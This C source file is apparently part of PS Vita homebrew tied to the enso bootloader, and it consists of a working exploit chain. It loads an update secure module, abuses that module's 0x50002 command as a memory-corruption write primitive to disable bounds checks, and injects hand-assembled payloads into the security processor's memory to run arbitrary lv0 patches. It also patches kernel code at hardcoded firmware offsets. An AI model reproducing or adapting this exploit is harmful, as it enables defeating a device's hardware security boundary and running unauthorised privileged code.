// b

#include <inttypes.h>
#include <stdio.h>

#ifdef FW_365
	#include "../../../enso/365/nsbl.h"
#else
	#include "../../../enso/360/nsbl.h"
#endif

#include "../../../enso/ex_defs.h"
#include "spl-defs.h"
	
#define DACR_OFF(stmt)                 \
do {                                   \
    unsigned prev_dacr;                \
    __asm__ volatile(                  \
        "mrc p15, 0, %0, c3, c0, 0 \n" \
        : "=r" (prev_dacr)             \
    );                                 \
    __asm__ volatile(                  \
        "mcr p15, 0, %0, c3, c0, 0 \n" \
        : : "r" (0xFFFF0000)           \
    );                                 \
    stmt;                              \
    __asm__ volatile(                  \
        "mcr p15, 0, %0, c3, c0, 0 \n" \
        : : "r" (prev_dacr)            \
    );                                 \
} while (0)

// per-fw offsets
#ifdef FW_365
	#define LOADSM_KA_NOP_1 0x51016cf2
	#define LOADSM_KA_NOP_2 0x51016cf4
	#define LOADSM_KA_NOP_R 0x51016cf0
	#define CALL_KA_NOP_A 0x51016bec
	#define CALL_KA_NOP_R 0x51016be0
	#define LOAD_KASM_PROXY 0x51016e34
#else
	#define LOADSM_KA_NOP_1 0x51016bb6
	#define LOADSM_KA_NOP_2 0x51016bb8
	#define LOADSM_KA_NOP_R 0x51016bb0
	#define CALL_KA_NOP_A 0x51016ab0
	#define CALL_KA_NOP_R 0x51016ab0
	#define LOAD_KASM_PROXY 0x51016cf8
#endif

// sm_auth_info
static const unsigned char ctx_130_data[0x90] =
{
  0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x28, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 
  0xc0, 0x00, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 
  0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x09, 
  0x80, 0x03, 0x00, 0x00, 0xc3, 0x00, 0x00, 0x00, 0x80, 0x09, 
  0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00
};

// run code @ 0x1f850100 and jump back to 0xd0002::sw6
static const unsigned char NMPstage2_payload[] =
{
	0x21, 0xc0, 0x85, 0x1f,	// movh r0, 0x1f85
	0x04, 0xc0, 0x00, 0x01,	// or3 r0, r0, 0x100
	0x0f, 0x10,				// jsr r0
	0x21, 0xc0, 0x00, 0x00,	// movh r0, 0x0
	0x26, 0xd3, 0xbd, 0x80,	// movu r3, 0x80bd26	(0x80bd8c on .71)
	0x3e, 0x10				// jmp r3
};

static const unsigned char inject_framework_nmp[] = {
  0xa0, 0x6f, 0x16, 0x4d, 0x12, 0x4e, 0x1a, 0x7b, 0x0e, 0x4b, 0x00, 0x53,
  0x06, 0x43, 0x16, 0xd3, 0x10, 0x80, 0xfa, 0x03, 0xfe, 0x00, 0x01, 0xc3,
  0x00, 0x01, 0x21, 0xc2, 0x85, 0x1f, 0x24, 0xc2, 0x00, 0x02, 0x00, 0xd1,
  0x9e, 0x80, 0x0f, 0x10, 0x06, 0x40, 0x72, 0xd3, 0x03, 0x80, 0x01, 0xc2,
  0x79, 0xdc, 0x39, 0x02, 0x74, 0xd3, 0x03, 0x80, 0x01, 0xc2, 0x9a, 0x00,
  0x39, 0x02, 0xfe, 0xd3, 0x0a, 0x80, 0x01, 0xc2, 0x10, 0x06, 0x39, 0x02,
  0x07, 0x43, 0x30, 0x00, 0x13, 0x4e, 0x17, 0x4d, 0x0f, 0x4b, 0x60, 0x6f,
  0xbe, 0x10, 0x00, 0x00, 0xf0, 0xff, 0x1f, 0x00
};

static const unsigned char framework_nmp[] = {
  0xc0, 0x6f, 0x06, 0x45, 0x1a, 0x7b, 0x21, 0xc5, 0x85, 0x1f, 0xfa, 0x0b,
  0x5f, 0x02, 0x01, 0xc3, 0xff, 0x14, 0x35, 0xe2, 0x15, 0x00, 0x5b, 0xc2,
  0x03, 0x00, 0x34, 0x53, 0x35, 0xe2, 0x10, 0x00, 0x5e, 0xc0, 0x04, 0x00,
  0x5e, 0xc1, 0x08, 0x00, 0x69, 0x53, 0x58, 0xc3, 0x03, 0x00, 0x0f, 0x10,
  0x5a, 0xc0, 0x0c, 0x00, 0x07, 0x45, 0xfe, 0x0b, 0x40, 0x6f, 0xbe, 0x10,
  0x21, 0xc3, 0x00, 0xe0, 0x34, 0xc3, 0x10, 0x00, 0x3e, 0x01, 0xdc, 0xd3,
  0x0a, 0x80, 0x3f, 0x10, 0xe8, 0xbf, 0x00, 0x00, 0xf0, 0xff, 0x1f, 0x00
};

typedef struct {
  void *addr;
  uint32_t length;
} __attribute__((packed)) region_t;

typedef struct {
  uint32_t unused_0[2];
  uint32_t use_lv2_mode_0; // if 1, use lv2 list
  uint32_t use_lv2_mode_1; // if 1, use lv2 list
  uint32_t unused_10[3];
  uint32_t list_count; // must be < 0x1F1
  uint32_t unused_20[4];
  uint32_t total_count; // only used in LV1 mode
  uint32_t unused_34[1];
  union {
    region_t lv1[0x1F1];
    region_t lv2[0x1F1];
  } list;
} __attribute__((packed)) cmd_0x50002_t;

typedef struct heap_hdr {
  void *data;
  uint32_t size;
  uint32_t size_aligned;
  uint32_t padding;
  struct NMPheap_hdr *prev;
  struct NMPheap_hdr *next;
} __attribute__((packed)) heap_hdr_t;

typedef struct SceSblSmCommContext130 {
    uint32_t unk_0;
    uint32_t self_type; // 2 - user = 1 / kernel = 0
    char data0[0x90]; //hardcoded data
    char data1[0x90];
    uint32_t pathId; // 2 (2 = os0)
    uint32_t unk_12C;
} SceSblSmCommContext130;

typedef struct SceKernelAddrPair {
	uint32_t addr;                  
	uint32_t length;                
} SceKernelAddrPair;
  
typedef struct SceKernelPaddrList {
	uint32_t size;                  
	uint32_t list_size;             
	uint32_t ret_length;            
	uint32_t ret_count;             
	SceKernelAddrPair *list;        
} SceKernelPaddrList;

typedef struct corrupt_args_cmd {
   unsigned int size;
   unsigned int service_id;
   unsigned int response;
   unsigned int unk2;
   unsigned int padding[(0x40 - 0x10) / 4];
   cmd_0x50002_t cargs;
} corrupt_args_cmd;

typedef struct jump_args_cmd {
   unsigned int size;
   unsigned int service_id;
   unsigned int response;
   unsigned int unk2;
   unsigned int padding[(0x40 - 0x10) / 4];
   uint32_t req[16];
} jump_args_cmd;

#ifdef FW_365
static int (*smtool_invoke)(uint32_t param_1, uint32_t self_paddr_list_paddr, uint32_t self_paddr_list_count, uint32_t *param_4, SceSblSmCommContext130 *param_5, int *id) = (void*)0x51015f21;
static int (*smtool_call_big_ka)(void *argv, uint32_t args, uint32_t cmdid) = (void*)0x51016bc9;
static int (*smtool_stop)(void) = (void*)0x51017065;
static int (*smtool_load_ka)(void) = (void*)0x51016c59;
static int (*get_paddr_single)(void *va, void *pa) = (void*)0x5100632d;
static int (*get_paddr_list)(void *vrange, void *palist) = (void*)0x51006345;
static int (*smc_custom)() = (void*)0x51016a10;
#else
static int (*smtool_invoke)(uint32_t param_1, uint32_t self_paddr_list_paddr, uint32_t self_paddr_list_count, uint32_t *param_4, SceSblSmCommContext130 *param_5, int *id) = (void*)0x51015de5;
static int (*smtool_call_big_ka)(void *argv, uint32_t args, uint32_t cmdid) = (void*)0x51016a8d;
static int (*smtool_stop)(void) = (void*)0x51016f29;
static int (*smtool_load_ka)(void) = (void*)0x51016b1d;
static int (*get_paddr_single)(void *va, void *pa) = (void*)0x5100788d;
static int (*get_paddr_list)(void *vrange, void *palist) = (void*)0x510078a5;
static int (*smc_custom)() = (void*)0x510168d4;
#endif

static void *payload_block_addr = NULL;

// Read file to a memblock/buf, mark as RX if req, return ptr (only FAT16 FS, max sz 8MB)
static void *load_file(char *fpath, char *blkname, unsigned int size, int mode) {
	int fd = iof_open(fpath, 1, 0);
	if (fd >= 0) {
		if (mode == 3) {
			iof_close(fd);
			return (void *)1;
		}
		if (size == 0)
			size = iof_lseek(fd, 0, 0, 0, 2);
		if (mode > 1) { // direct/fixed sz mode
			if ((int)iof_lseek(fd, 0, 0, 0, 0) >= 0 && iof_read(fd, (void *)blkname, size) >= 0) {
				if (*(uint32_t *)blkname == 0) { // assume that the file has some magic
					iof_close(fd);
					return (void *)2;
				}
				iof_close(fd);
				return NULL;
			}
			iof_close(fd);
			return (void *)3;
		}
		unsigned int blksz = 0x1000;
		while (blksz < size && blksz < 0x800000)
			blksz-=-0x1000;
		int mblk = sceKernelAllocMemBlock(blkname, 0x1020D006, blksz, NULL);
		void *xbas = NULL;
		sceKernelGetMemBlockBase(mblk, (void **)&xbas);
		if (size < blksz && (int)iof_lseek(fd, 0, 0, 0, 0) >= 0 && iof_read(fd, xbas, size) >= 0 && *(uint32_t *)xbas != 0) {
			iof_close(fd);
			if (mode) {
				sceKernelRemapBlock(mblk, 0x1020D005);
				clean_dcache(xbas, blksz);
				flush_icache();
			}
			return xbas;
		}
		iof_close(fd);
		sceKernelFreeMemBlock(mblk);
	}
	return NULL;
}

static int load_sm(int *ctx, char *argpath, unsigned int smsz) {
	int sm_block = sceKernelAllocMemBlock("sm_cached", 0x10208006, (smsz + 0xfff) & 0xfffff000, 0), cmd_block = sceKernelAllocMemBlock("load_sm_cmd", 0x10208006, 0x1000, 0);
	void *sm_block_addr = NULL, *cmd_block_addr = NULL;
	sceKernelGetMemBlockBase(sm_block, (void**)&sm_block_addr); // block for SM
	sceKernelGetMemBlockBase(cmd_block, (void**)&cmd_block_addr); // block for SM args
	if (load_file(argpath, sm_block_addr, smsz, 2) != NULL)
		return 1;
	SceSblSmCommContext130 smcomm_ctx; //
	memset(&smcomm_ctx, 0, 0x130); //
    memcpy(&smcomm_ctx.data0, ctx_130_data, 0x90); // configure the sm_auth_info block
    smcomm_ctx.pathId = 2; //
    smcomm_ctx.self_type = (smcomm_ctx.self_type & 0xFFFFFFF0) | 2; //
	SceKernelPaddrList paddr_list;
	SceKernelAddrPair pairs[8];
	SceKernelAddrPair vrange;
	uint32_t paddr_pairs_paddr = 0;
	vrange.addr = (uint32_t)(sm_block_addr);
	vrange.length = smsz;
	paddr_list.size = 0x14;
	paddr_list.list = &pairs[0];
	paddr_list.list_size = 8;
	get_paddr_list(&vrange, &paddr_list); // get SM PArange
	memcpy(cmd_block_addr, &pairs, paddr_list.ret_count * 8);
	get_paddr_single(cmd_block_addr, &paddr_pairs_paddr); // get PArange PAddr (lul)
	if (smtool_invoke(0, paddr_pairs_paddr, paddr_list.ret_count, NULL, &smcomm_ctx, ctx) < 0) // load the SM
		return 3;
	*(uint16_t *)LOADSM_KA_NOP_1 = 0x2000; // remove the loadsm call from load_kprauthsm (since ussm is already loaded)
	*(uint16_t *)LOADSM_KA_NOP_2 = 0x2000; //
	clean_dcache((void *)LOADSM_KA_NOP_R, 0x10);
	flush_icache();
	if (smtool_load_ka() < 0) // enable cry2arm, TZ magic, SM start
		return 6;
	*(uint16_t *)LOADSM_KA_NOP_1 = 0xf7ff; // undo load_kprauthsm patches
	*(uint16_t *)LOADSM_KA_NOP_2 = 0xf915; //
	clean_dcache((void *)LOADSM_KA_NOP_R, 0x10);
	flush_icache();
	sceKernelFreeMemBlock(sm_block);
	sceKernelFreeMemBlock(cmd_block);
	return 0;
}

// zero32 using the 0x50002 write primitive
static void corrupt(void *cmd_buf, uint32_t addr) {
	corrupt_args_cmd *cormd = cmd_buf;
	memset(cmd_buf, 0, sizeof(corrupt_args_cmd));
	cormd->size = sizeof(cmd_0x50002_t) + 0x40;
	cormd->service_id = 0x50002;
	cormd->cargs.use_lv2_mode_0 = cormd->cargs.use_lv2_mode_1 = 0;
	cormd->cargs.list_count = 3;
	cormd->cargs.total_count = 1;
	cormd->cargs.list.lv1[0].addr = cormd->cargs.list.lv1[1].addr = (void *)0x50000000;
	cormd->cargs.list.lv1[0].length = cormd->cargs.list.lv1[1].length = 0x10;
	cormd->cargs.list.lv1[2].addr = 0;
	cormd->cargs.list.lv1[2].length = addr - offsetof(heap_hdr_t, next);
	smtool_call_big_ka(cmd_buf, sizeof(cmd_0x50002_t) + 0x40, 0x50002);
	return;
}

// add rvk patches
static void cmep_run() {
	SceKernelAllocMemBlockKernelOpt optp;
	optp.size = 0x58;
	optp.attr = 2;
	optp.paddr = 0x1f850000; // venezia SPRAM
	int args_block = sceKernelAllocMemBlock("sm_args", 0x10208006, 0x1000, 0), curr = 0, payload_block = sceKernelAllocMemBlock("jump_commem", 0x10208006, 0x10000, &optp);
	void *args_block_addr = NULL;// *payload_block_addr = NULL;
	sceKernelGetMemBlockBase(args_block, (void**)&args_block_addr); // for SM args
	DACR_OFF(
		sceKernelGetMemBlockBase(payload_block, (void**)&payload_block_addr); // for payload(s)
	);
	char bkp[0x80];
	memcpy(&bkp, payload_block_addr, 0x80); // save first 0x80 bytes of SPRAM
	*(uint16_t *)CALL_KA_NOP_A = 0xBF00; // patch call_kprxauthsm_func to not modify 3rd arg
	clean_dcache((void *)CALL_KA_NOP_R, 0x10);
	flush_icache();
	while (0x0080bd10 + curr < 0x0080bd24) {
		corrupt(args_block_addr, (0x0080bd10 + curr)); // patch ussm::0xd0002 to skip bound checks
		curr = curr + 4;
	}
	memset(payload_block_addr, 0, 0x300);
	memcpy(payload_block_addr, &NMPstage2_payload, sizeof(NMPstage2_payload)); // stage2 payload that will jump to base+0x100
	memcpy((payload_block_addr + 0x100), &inject_framework_nmp, sizeof(inject_framework_nmp)); // type patch installer
	memcpy((payload_block_addr + 0x200), &framework_nmp, sizeof(framework_nmp)); // type patch installer
	jump_args_cmd *jumd = args_block_addr;
	memset(args_block_addr, 0, sizeof(jump_args_cmd) + 0x40);
	jumd->size = sizeof(jump_args_cmd) + 0x40;
	jumd->service_id = 0xd0002;
	jumd->req[0] = 0x1f850000; // paddr of stage2
	smtool_call_big_ka(args_block_addr, sizeof(jump_args_cmd) + 0x40, 0xd0002); // (call_kprxauthsm_func), this gets paddrs and calls SMC
	*(uint16_t *)CALL_KA_NOP_A = 0x6073; // undo the 3rd arg patch
	clean_dcache((void *)CALL_KA_NOP_R, 0x10);
	flush_icache();
	memcpy(payload_block_addr, &bkp, 0x80); // restore first 0x80 bytes of SPRAM (WHY? something dies)
	sceKernelFreeMemBlock(args_block);
	// sceKernelFreeMemBlock(payload_block);
	return;
}

// #include your lv0 patchers
#include "0syscall6/0syscall6.c"

__attribute__((optimize("O0"))) void gp_main(void) {
	// ---------- SPL_START
	if (load_sm((int *)0x5113f0e8, "os0:spl_ussm.self", 42456) == 0) { // load update_sm
		cmep_run(); // add spl patches
		smtool_stop(); // stop the sm to allow kprxauth load
	// ---------- SPL_END - can run lv0 payloads via spl
	
	// Call your lv0 patchers here
		zss_patch();
	}
	return;
}

__attribute__ ((section (".text.start"))) void start(void) {
	gp_main();
	return;
}